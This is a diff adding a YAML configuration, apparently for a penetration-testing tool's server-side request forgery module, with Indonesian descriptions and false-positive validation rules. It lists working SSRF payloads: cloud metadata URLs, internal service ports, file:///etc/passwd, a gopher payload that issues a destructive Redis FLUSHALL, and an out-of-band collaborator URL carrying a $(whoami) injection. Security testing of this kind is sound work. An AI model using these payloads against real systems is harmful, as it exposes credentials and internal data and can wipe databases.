@@ -1,0 +1,61 @@
+name: ssrf
+description: Server-Side Request Forgery detection and exploitation
+phase: exploit
+priority: 9
+
+conditions:
+  triggers:
+    - Endpoint menerima URL sebagai parameter (url, path, redirect, callback)
+    - Fitur fetch external (preview link, webhook, import, proxy)
+    - Fitur generate PDF dari URL
+    - Webhook callback configuration
+  not_recommended:
+    - URL allowlist ketat (hanya domain tertentu)
+    - Input divalidasi dengan urlparse + hostname check
+    - Network policy: egress terbatas via firewall
+
+payloads:
+  cloud_metadata:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://169.254.169.254/latest/user-data/"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://100.100.100.200/latest/meta-data/"
+  internal_services:
+    - "http://127.0.0.1:80"
+    - "http://127.0.0.1:8080"
+    - "http://127.0.0.1:9200" # Elasticsearch
+    - "http://127.0.0.1:6379" # Redis
+    - "http://127.0.0.1:3306" # MySQL
+    - "http://localhost/proc/self/environ"
+  blind_oob:
+    - "http://{collaborator_url}/ssrf-test"
+    - "http://{collaborator_url}/$(whoami)"
+  protocol_smuggling:
+    - "file:///etc/passwd"
+    - "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL"
+    - "dict://127.0.0.1:6379/info"
+
+tools:
+  primary: manual (curl/httpx)
+  collaborator: [burp_collaborator, interactsh, requestbin]
+  manual: [curl, httpx, python]
+
+validation:
+  method: deterministic
+  rules:
+    - type: oob_callback
+      method: "kirim payload → cek collaborator → ada HTTP callback"
+    - type: content_based
+      method: "response mengandung metadata cloud (/latest/meta-data/)"
+    - type: timing
+      method: "request ke internal timeout/refuse vs external sukses"
+  reject_if:
+    - "Response 400/500 tanpa content (belum tentu SSRF)"
+    - "DNS lookup sukses tapi no HTTP callback (bisa DNS rebinding)"
+    - "Timeout disemua URL (network blocked, bukan SSRF)"
+
+examples:
+  - target: "/fetch?url=http://example.com"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    indicator: "ami-id, instance-id, public-keys"
+    tool: "curl"
